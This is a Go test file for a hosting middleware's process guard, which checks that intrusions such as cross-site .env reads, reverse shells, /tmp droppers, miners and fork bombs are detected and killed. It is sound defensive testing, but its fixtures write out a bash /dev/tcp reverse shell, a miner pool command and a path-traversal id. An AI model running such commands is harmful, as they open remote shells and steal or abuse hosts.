package guard

import (
	"fmt"
	"os"
	"path/filepath"
	"sort"
	"strconv"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/dcimorra/the-middleware/internal/events"
	"github.com/dcimorra/the-middleware/internal/fsx"
	"github.com/dcimorra/the-middleware/internal/manifest"
	"github.com/dcimorra/the-middleware/internal/runtime"
)

// fakeProc builds a /proc look-alike in a temp dir with the files the
// reader uses: <pid>/stat, cmdline, cwd and exe links, fd/ sockets, and
// net/tcp for listeners.
type fakeProc struct {
	t         *testing.T
	root      string
	bootUnix  int64
	listeners []string // net/tcp lines
	nextInode uint64
}

func newFakeProc(t *testing.T) *fakeProc {
	t.Helper()
	fp := &fakeProc{t: t, root: t.TempDir(), bootUnix: 1_700_000_000, nextInode: 1000}
	if err := os.WriteFile(filepath.Join(fp.root, "stat"), []byte("cpu  1 2 3 4\nbtime "+strconv.FormatInt(fp.bootUnix, 10)+"\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	fp.flushNet()
	return fp
}

type procSpec struct {
	pid, ppid, pgid int
	comm            string
	cmdline         []string
	cwd, exe        string
	startSec        int64 // seconds after boot
	listen          []int
	cgroup          string
}

func (fp *fakeProc) add(s procSpec) {
	fp.t.Helper()
	dir := filepath.Join(fp.root, strconv.Itoa(s.pid))
	if err := os.MkdirAll(filepath.Join(dir, "fd"), 0o755); err != nil {
		fp.t.Fatal(err)
	}
	if s.pgid == 0 {
		s.pgid = s.pid
	}
	// pid (comm) state ppid pgrp session tty tpgid flags minflt cminflt majflt cmajflt utime stime cutime cstime priority nice threads itrealvalue starttime …
	stat := statLine(s, 0, 0)
	if err := os.WriteFile(filepath.Join(dir, "stat"), []byte(stat), 0o644); err != nil {
		fp.t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "cmdline"), []byte(strings.Join(s.cmdline, "\x00")+"\x00"), 0o644); err != nil {
		fp.t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "status"), []byte("Name:\t"+s.comm+"\nUid:\t1000\t1000\t1000\t1000\n"), 0o644); err != nil {
		fp.t.Fatal(err)
	}
	if s.cgroup != "" {
		if err := os.WriteFile(filepath.Join(dir, "cgroup"), []byte(s.cgroup), 0o644); err != nil {
			fp.t.Fatal(err)
		}
	}
	if s.cwd != "" {
		if err := os.Symlink(s.cwd, filepath.Join(dir, "cwd")); err != nil {
			fp.t.Fatal(err)
		}
	}
	if s.exe != "" {
		if err := os.Symlink(s.exe, filepath.Join(dir, "exe")); err != nil {
			fp.t.Fatal(err)
		}
	}
	for i, port := range s.listen {
		inode := fp.nextInode
		fp.nextInode++
		fp.listeners = append(fp.listeners, fmt.Sprintf("   %d: 0100007F:%04X 00000000:0000 0A 00000000:00000000 00:00000000 00000000  1000        0 %d 1 0000000000000000 100 0 0 10 0", i, port, inode))
		if err := os.Symlink(fmt.Sprintf("socket:[%d]", inode), filepath.Join(dir, "fd", strconv.Itoa(3+i))); err != nil {
			fp.t.Fatal(err)
		}
	}
	fp.flushNet()
}

// statLine is a stat file with CPU ticks and resident pages filled in.
func statLine(s procSpec, ticks, pages int64) string {
	return fmt.Sprintf("%d (%s) S %d %d %d 0 -1 4194304 0 0 0 0 %d 0 0 0 20 0 1 0 %d 0 %d", s.pid, s.comm, s.ppid, s.pgid, s.pgid, ticks, s.startSec*100, pages)
}

// setUsage rewrites a process's stat with new CPU ticks and memory.
func (fp *fakeProc) setUsage(s procSpec, ticks, pages int64) {
	fp.t.Helper()
	if s.pgid == 0 {
		s.pgid = s.pid
	}
	if err := os.WriteFile(filepath.Join(fp.root, strconv.Itoa(s.pid), "stat"), []byte(statLine(s, ticks, pages)), 0o644); err != nil {
		fp.t.Fatal(err)
	}
}

func (fp *fakeProc) flushNet() {
	fp.t.Helper()
	if err := os.MkdirAll(filepath.Join(fp.root, "net"), 0o755); err != nil {
		fp.t.Fatal(err)
	}
	content := "  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode\n" + strings.Join(fp.listeners, "\n") + "\n"
	if err := os.WriteFile(filepath.Join(fp.root, "net", "tcp"), []byte(content), 0o644); err != nil {
		fp.t.Fatal(err)
	}
}

// house is a root folder with sites and state files.
type house struct {
	t     *testing.T
	root  string
	sites []SiteInfo
}

func newHouse(t *testing.T) *house {
	return &house{t: t, root: t.TempDir()}
}

func (h *house) site(domain string, rootPID int, ports ...int) SiteInfo {
	h.t.Helper()
	dir := filepath.Join(h.root, "sites", domain)
	if err := os.MkdirAll(dir, 0o755); err != nil {
		h.t.Fatal(err)
	}
	m := &manifest.Manifest{Version: manifest.Version, Run: &manifest.Run{Command: []string{"./server"}}}
	if err := manifest.Save(dir, m); err != nil {
		h.t.Fatal(err)
	}
	if rootPID > 0 {
		st := runtime.State{Domain: domain, Runtime: "process", PID: rootPID, Port: firstOr(ports, 0)}
		if err := fsx.WriteJSON(filepath.Join(h.root, "data", "state", domain+".json"), st, 0o644); err != nil {
			h.t.Fatal(err)
		}
	}
	s := SiteInfo{Domain: domain, Dir: dir, Ports: ports}
	h.sites = append(h.sites, s)
	return s
}

func firstOr(xs []int, d int) int {
	if len(xs) == 0 {
		return d
	}
	return xs[0]
}

func (h *house) disabled(domain string) bool {
	h.t.Helper()
	m, err := manifest.Load(filepath.Join(h.root, "sites", domain))
	if err != nil {
		h.t.Fatal(err)
	}
	return m.Disabled
}

type killLog struct {
	mu   sync.Mutex
	pids []int
}

func (k *killLog) kill(pid int) error {
	k.mu.Lock()
	k.pids = append(k.pids, pid)
	k.mu.Unlock()
	return nil
}

func (k *killLog) sorted() []int {
	k.mu.Lock()
	defer k.mu.Unlock()
	out := append([]int(nil), k.pids...)
	sort.Ints(out)
	return out
}

func newGuard(t *testing.T, fp *fakeProc, h *house, kills *killLog, now time.Time) (*Guard, *events.Bus) {
	t.Helper()
	bus := events.New("")
	g := New(Options{
		ProcRoot:  fp.root,
		DataDir:   filepath.Join(h.root, "data"),
		SitesDir:  filepath.Join(h.root, "sites"),
		Sites:     func() []SiteInfo { return h.sites },
		PortRange: [2]int{33000, 47000},
		Bus:       bus,
		Kill:      kills.kill,
		Now:       func() time.Time { return now },
	})
	return g, bus
}

func TestAProcessWorkingInAnotherSitesFolderIsAnIntrusion(t *testing.T) {
	fp := newFakeProc(t)
	h := newHouse(t)
	a := h.site("a.example", 100, 33001)
	h.site("b.example", 200, 33002)
	fp.add(procSpec{pid: 100, ppid: 1, comm: "server", cmdline: []string{"./server"}, cwd: a.Dir, exe: a.Dir + "/server", startSec: 10, listen: []int{33001}})
	fp.add(procSpec{pid: 101, ppid: 100, pgid: 100, comm: "sh", cmdline: []string{"sh", "-c", "cat " + filepath.Join(h.root, "sites", "b.example", ".env")}, cwd: a.Dir, exe: "/bin/sh", startSec: 20})
	fp.add(procSpec{pid: 102, ppid: 101, pgid: 100, comm: "cat", cmdline: []string{"cat"}, cwd: filepath.Join(h.root, "sites", "b.example"), exe: "/bin/cat", startSec: 21})
	fp.add(procSpec{pid: 200, ppid: 1, comm: "server", cmdline: []string{"./server"}, cwd: filepath.Join(h.root, "sites", "b.example"), startSec: 10, listen: []int{33002}})
	kills := &killLog{}
	g, bus := newGuard(t, fp, h, kills, time.Unix(fp.bootUnix+600, 0))
	ch, stop := bus.Subscribe()
	defer stop()
	incs, err := g.Sweep()
	if err != nil {
		t.Fatal(err)
	}
	if len(incs) != 1 || incs[0].Rule != "foreign-site" || incs[0].Level != LevelIntrusion || incs[0].Domain != "a.example" {
		t.Fatalf("incidents: %+v", incs)
	}
	// The offending shell and its child die; the site's root and the
	// innocent site stay (the engine stops the root through the manifest).
	if got := kills.sorted(); fmt.Sprint(got) != "[101 102]" {
		t.Fatalf("killed %v, want the shell and its child", got)
	}
	if !h.disabled("a.example") || h.disabled("b.example") {
		t.Fatal("a.example must be disabled in its manifest and b.example untouched")
	}
	var ev events.Event
	for ev.Type != "guard.intrusion" {
		select {
		case ev = <-ch:
		case <-time.After(time.Second):
			t.Fatal("no guard.intrusion event")
		}
	}
	if ev.Level != "error" || ev.Subject != "a.example" {
		t.Fatalf("event %+v", ev)
	}
	// The incident is on disk and can be dismissed.
	list, err := g.Incidents()
	if err != nil || len(list) != 1 || list[0].ID != incs[0].ID || !strings.Contains(list[0].Action, "site disabled") {
		t.Fatalf("incidents on disk: %+v (%v)", list, err)
	}
	if err := g.Dismiss(list[0].ID); err != nil {
		t.Fatal(err)
	}
	list, _ = g.Incidents()
	if !list[0].Dismissed {
		t.Fatal("dismiss did not stick")
	}
	if err := g.Dismiss("../../../etc/passwd"); err == nil {
		t.Fatal("a path as an id must be refused")
	}
	// Once the killed processes are gone (SIGKILL is not optional in real
	// life; the fake table needs a hand), a second sweep reports nothing.
	for _, pid := range kills.sorted() {
		if err := os.RemoveAll(filepath.Join(fp.root, strconv.Itoa(pid))); err != nil {
			t.Fatal(err)
		}
	}
	incs, _ = g.Sweep()
	if len(incs) != 0 {
		t.Fatalf("repeated report: %+v", incs)
	}
}

func TestAnUnassignedPortIsSuspiciousAndKillsNothing(t *testing.T) {
	fp := newFakeProc(t)
	h := newHouse(t)
	a := h.site("a.example", 100, 33001, 8090)
	fp.add(procSpec{pid: 100, ppid: 1, comm: "server", cmdline: []string{"./server"}, cwd: a.Dir, startSec: 10, listen: []int{33001, 4444}})
	fp.add(procSpec{pid: 110, ppid: 1, comm: "api", cmdline: []string{"./bin/api"}, cwd: a.Dir, startSec: 10, listen: []int{8090}})
	fp.add(procSpec{pid: 111, ppid: 100, pgid: 100, comm: "next", cmdline: []string{"next"}, cwd: a.Dir, startSec: 10, listen: []int{33050}})
	kills := &killLog{}
	g, bus := newGuard(t, fp, h, kills, time.Unix(fp.bootUnix+600, 0))
	ch, stop := bus.Subscribe()
	defer stop()
	incs, err := g.Sweep()
	if err != nil {
		t.Fatal(err)
	}
	if len(incs) != 1 || incs[0].Rule != "foreign-port" || incs[0].Level != LevelSuspicious || !strings.Contains(incs[0].Where, "4444") {
		t.Fatalf("incidents: %+v", incs)
	}
	if len(kills.sorted()) != 0 || h.disabled("a.example") {
		t.Fatal("a suspicious finding must not kill or disable anything")
	}
	select {
	case ev := <-ch:
		if ev.Type != "guard.suspicious" || ev.Level != "warn" {
			t.Fatalf("event %+v", ev)
		}
	case <-time.After(time.Second):
		t.Fatal("no guard.suspicious event")
	}
}

func TestAReverseShellAndATmpBinaryAreKilledWithTheirTree(t *testing.T) {
	fp := newFakeProc(t)
	h := newHouse(t)
	a := h.site("a.example", 100, 33001)
	fp.add(procSpec{pid: 100, ppid: 1, comm: "node", cmdline: []string{"node", "server.js"}, cwd: a.Dir, exe: "/usr/bin/node", startSec: 10})
	fp.add(procSpec{pid: 120, ppid: 100, pgid: 100, comm: "bash", cmdline: []string{"bash", "-c", "bash -i >& /dev/tcp/203.0.113.1/4444 0>&1"}, cwd: a.Dir, exe: "/bin/bash", startSec: 30})
	fp.add(procSpec{pid: 121, ppid: 120, pgid: 100, comm: "bash", cmdline: []string{"bash", "-i"}, cwd: a.Dir, exe: "/bin/bash", startSec: 31})
	kills := &killLog{}
	g, _ := newGuard(t, fp, h, kills, time.Unix(fp.bootUnix+600, 0))
	incs, err := g.Sweep()
	if err != nil {
		t.Fatal(err)
	}
	if len(incs) != 1 || incs[0].Rule != "reverse-shell" {
		t.Fatalf("incidents: %+v", incs)
	}
	if got := kills.sorted(); fmt.Sprint(got) != "[120 121]" {
		t.Fatalf("killed %v", got)
	}
	if !h.disabled("a.example") {
		t.Fatal("site not disabled")
	}

	// A fresh house: a dropper running from /tmp.
	fp2 := newFakeProc(t)
	h2 := newHouse(t)
	b := h2.site("b.example", 300, 33003)
	fp2.add(procSpec{pid: 300, ppid: 1, comm: "server", cmdline: []string{"./server"}, cwd: b.Dir, exe: b.Dir + "/server", startSec: 10})
	fp2.add(procSpec{pid: 301, ppid: 300, pgid: 300, comm: "x", cmdline: []string{"/tmp/.x/payload"}, cwd: b.Dir, exe: "/tmp/.x/payload", startSec: 50})
	kills2 := &killLog{}
	g2, _ := newGuard(t, fp2, h2, kills2, time.Unix(fp2.bootUnix+600, 0))
	incs, _ = g2.Sweep()
	if len(incs) != 1 || incs[0].Rule != "tmp-binary" || fmt.Sprint(kills2.sorted()) != "[301]" {
		t.Fatalf("incidents %+v kills %v", incs, kills2.sorted())
	}
}

func TestAMinerAndAForkBombAreIntrusions(t *testing.T) {
	fp := newFakeProc(t)
	h := newHouse(t)
	a := h.site("a.example", 100, 33001)
	fp.add(procSpec{pid: 100, ppid: 1, comm: "server", cmdline: []string{"./server"}, cwd: a.Dir, startSec: 10})
	fp.add(procSpec{pid: 130, ppid: 100, pgid: 100, comm: "kworker", cmdline: []string{"./kworker", "-o", "stratum+tcp://pool.example:3333"}, cwd: a.Dir, exe: a.Dir + "/kworker", startSec: 40})
	kills := &killLog{}
	g, _ := newGuard(t, fp, h, kills, time.Unix(fp.bootUnix+600, 0))
	incs, _ := g.Sweep()
	if len(incs) != 1 || incs[0].Rule != "miner" {
		t.Fatalf("incidents: %+v", incs)
	}

	fp2 := newFakeProc(t)
	h2 := newHouse(t)
	b := h2.site("b.example", 500, 33005)
	fp2.add(procSpec{pid: 500, ppid: 1, comm: "server", cmdline: []string{"./server"}, cwd: b.Dir, startSec: 10})
	for i := 1; i <= maxProcesses+5; i++ {
		fp2.add(procSpec{pid: 500 + i, ppid: 500, pgid: 500, comm: "sh", cmdline: []string{"sh"}, cwd: b.Dir, startSec: 20})
	}
	kills2 := &killLog{}
	g2, _ := newGuard(t, fp2, h2, kills2, time.Unix(fp2.bootUnix+600, 0))
	incs, _ = g2.Sweep()
	if len(incs) != 1 || incs[0].Rule != "fork-bomb" {
		t.Fatalf("incidents: %+v", incs)
	}
	if got := len(kills2.sorted()); got != maxProcesses+6 {
		t.Fatalf("killed %d, want the whole tree", got)
	}
	if !h2.disabled("b.example") {
		t.Fatal("site not disabled")
	}
}

func TestAHealthySiteRaisesNothing(t *testing.T) {
	fp := newFakeProc(t)
	h := newHouse(t)
	a := h.site("a.example", 100, 33001)
	fp.add(procSpec{pid: 100, ppid: 1, comm: "node", cmdline: []string{"node", a.Dir + "/server.js"}, cwd: a.Dir, exe: "/usr/bin/node", startSec: 10, listen: []int{33001}})
	fp.add(procSpec{pid: 101, ppid: 100, pgid: 100, comm: "sh", cmdline: []string{"sh", "-c", "npm run build"}, cwd: a.Dir, exe: "/bin/sh", startSec: 11})
	// Someone else's process, not ours to judge.
	fp.add(procSpec{pid: 900, ppid: 1, comm: "sshd", cmdline: []string{"sshd"}, cwd: "/", exe: "/usr/sbin/sshd", startSec: 1, listen: []int{22}})
	kills := &killLog{}
	g, _ := newGuard(t, fp, h, kills, time.Unix(fp.bootUnix+600, 0))
	incs, err := g.Sweep()
	if err != nil {
		t.Fatal(err)
	}
	if len(incs) != 0 || len(kills.sorted()) != 0 || h.disabled("a.example") {
		t.Fatalf("incidents %+v kills %v", incs, kills.sorted())
	}
}

func TestTheReaperWaitsHalfAnHourRespectsCDPAndCapsAConversation(t *testing.T) {
	fp := newFakeProc(t)
	h := newHouse(t)
	fp.add(procSpec{pid: 700, ppid: 1, comm: "chrome", cmdline: []string{"/opt/chromium/chrome", "--headless"}, cwd: "/", exe: "/opt/chromium/chrome", startSec: 100})
	fp.add(procSpec{pid: 701, ppid: 700, pgid: 700, comm: "chrome", cmdline: []string{"/opt/chromium/chrome", "--type=renderer"}, cwd: "/", exe: "/opt/chromium/chrome", startSec: 101})
	// A browser whose parent is alive is somebody's, young or old.
	fp.add(procSpec{pid: 800, ppid: 1, comm: "node", cmdline: []string{"node", "scrape.js"}, cwd: "/home/x", startSec: 100})
	fp.add(procSpec{pid: 801, ppid: 800, pgid: 800, comm: "chrome", cmdline: []string{"chrome", "--headless"}, cwd: "/", startSec: 100})
	// An orphan someone is driving over CDP right now.
	fp.add(procSpec{pid: 900, ppid: 1, comm: "chrome", cmdline: []string{"chrome", "--headless", "--remote-debugging-port=9333"}, cwd: "/", startSec: 100})
	fp.listeners = append(fp.listeners, "   9: 0100007F:2475 0100007F:D431 01 00000000:00000000 00:00000000 00000000  1000        0 99999 1 0000000000000000 100 0 0 10 0")
	fp.flushNet()
	// A conversation's agent with five browsers open, all young.
	fp.add(procSpec{pid: 500, ppid: 1, comm: "claude", cmdline: []string{"claude", "-p"}, cwd: "/srv", startSec: 100})
	for i := 0; i < 5; i++ {
		fp.add(procSpec{pid: 510 + i, ppid: 500, comm: "chrome", cmdline: []string{"chrome", "--headless"}, cwd: "/", startSec: int64(1000 + i)})
	}
	kills := &killLog{}
	g, _ := newGuard(t, fp, h, kills, time.Unix(fp.bootUnix+100+20*60, 0))
	g.Sweep()
	// Twenty minutes: no orphan yet, but the conversation's two oldest.
	if got := kills.sorted(); fmt.Sprint(got) != "[510 511]" {
		t.Fatalf("killed %v, want the conversation's two oldest browsers", got)
	}
	g2, _ := newGuard(t, fp, h, kills, time.Unix(fp.bootUnix+100+31*60, 0))
	g2.Sweep()
	got := kills.sorted()
	if fmt.Sprint(got) != "[510 510 511 511 700 701]" && fmt.Sprint(got) != "[510 511 700 701]" {
		t.Fatalf("killed %v, want also the orphan and its renderer, and not the one driven over CDP", got)
	}
	data, err := os.ReadFile(filepath.Join(h.root, "data", "guard", "reaper.jsonl"))
	if err != nil || strings.Count(string(data), "\n") < 3 || !strings.Contains(string(data), `"pid":700`) {
		t.Fatalf("reaper log: %v\n%s", err, data)
	}
}

func TestTheReaderParsesTheRealProcWhenAvailable(t *testing.T) {
	if _, err := os.Stat("/proc/self/stat"); err != nil {
		t.Skip("no /proc here")
	}
	procs, err := Reader{}.Processes()
	if err != nil {
		t.Fatal(err)
	}
	me := os.Getpid()
	for _, p := range procs {
		if p.PID == me {
			if p.PPID != os.Getppid() || len(p.Cmdline) == 0 || p.Cwd == "" {
				t.Fatalf("own process read wrong: %+v", p)
			}
			if p.Started.IsZero() || time.Since(p.Started) > time.Hour {
				t.Fatalf("start time %v is not plausible", p.Started)
			}
			return
		}
	}
	t.Fatal("own process not in the table")
}

func TestAnAgentTurnIsNotJudgedForTheFoldersItsPromptNames(t *testing.T) {
	fp := newFakeProc(t)
	h := newHouse(t)
	a := h.site("a.example", 100, 33001)
	h.site("b.example", 200, 33002)
	other := filepath.Join(h.root, "sites", "b.example")
	fp.add(procSpec{pid: 100, ppid: 1, comm: "server", cmdline: []string{"./server"}, cwd: a.Dir, exe: a.Dir + "/server", startSec: 10, listen: []int{33001}})
	// The agent CLI and a tool it runs, both in the site's folder; its
	// prompt names the folder it is denied.
	fp.add(procSpec{pid: 300, ppid: 1, comm: "claude", cmdline: []string{"claude", "--append-system-prompt", "You may not read " + other}, cwd: a.Dir, exe: "/usr/bin/node", startSec: 30})
	fp.add(procSpec{pid: 301, ppid: 300, comm: "bash", cmdline: []string{"bash", "-c", "ls " + other}, cwd: a.Dir, exe: "/bin/bash", startSec: 31})
	// The same thing outside a turn is still an intrusion.
	fp.add(procSpec{pid: 400, ppid: 1, comm: "claude", cmdline: []string{"claude", "ls " + other}, cwd: a.Dir, exe: "/usr/bin/node", startSec: 32})
	fp.add(procSpec{pid: 200, ppid: 1, comm: "server", cmdline: []string{"./server"}, cwd: other, startSec: 10, listen: []int{33002}})
	kills := &killLog{}
	g, _ := newGuard(t, fp, h, kills, time.Unix(fp.bootUnix+600, 0))
	g.opts.Agents = func() []int { return []int{300} }
	incs, err := g.Sweep()
	if err != nil {
		t.Fatal(err)
	}
	if got := kills.sorted(); fmt.Sprint(got) != "[400]" || len(incs) != 1 {
		t.Fatalf("killed %v, incidents %+v: want only the process that is no turn's", got, incs)
	}
}

func TestASitesOwnPathAtTheEndOfASentenceIsNotAnotherSite(t *testing.T) {
	h := newHouse(t)
	a := h.site("a.example", 100, 33001)
	v := View{Site: SiteInfo{Domain: "a.example", Dir: a.Dir}, SitesDir: filepath.Join(h.root, "sites")}
	own := "Your working directory is the site's folder: " + filepath.Join(h.root, "sites", "a.example") + ". The whole project lives there."
	if got := foreignSite(v, own); got != "" {
		t.Fatalf("its own folder named %q", got)
	}
	if got := foreignSite(v, "cat "+filepath.Join(h.root, "sites", "b.example")+"."); got != "b.example" {
		t.Fatalf("another site's folder named %q", got)
	}
}

// The house's own binary is the init of every jail until it execs the
// command; under /tmp (a test binary) it is not a dropper. A task killed
// by the guard's tick in that instant failed the wired test on CI.
func TestAJailsInitFromAHouseUnderTmpIsNotAnIntrusion(t *testing.T) {
	old := houseBinary
	houseBinary = "/tmp/go-build123/b001/middleware.test"
	t.Cleanup(func() { houseBinary = old })
	fp := newFakeProc(t)
	h := newHouse(t)
	a := h.site("a.example", 100, 33001)
	fp.add(procSpec{pid: 100, ppid: 1, comm: "middleware.test", cmdline: []string{"middleware-jail", "--jail", "x", "--", "/bin/sh"}, cwd: a.Dir, exe: houseBinary, startSec: 10})
	fp.add(procSpec{pid: 101, ppid: 100, pgid: 100, comm: "x", cmdline: []string{"/tmp/.x/payload"}, cwd: a.Dir, exe: "/tmp/.x/payload", startSec: 11})
	kills := &killLog{}
	g, _ := newGuard(t, fp, h, kills, time.Unix(fp.bootUnix+600, 0))
	incs, _ := g.Sweep()
	if len(incs) != 1 || fmt.Sprint(kills.sorted()) != "[101]" {
		t.Fatalf("incidents %+v kills %v: the house's binary is not a dropper, the one beside it is", incs, kills.sorted())
	}
}
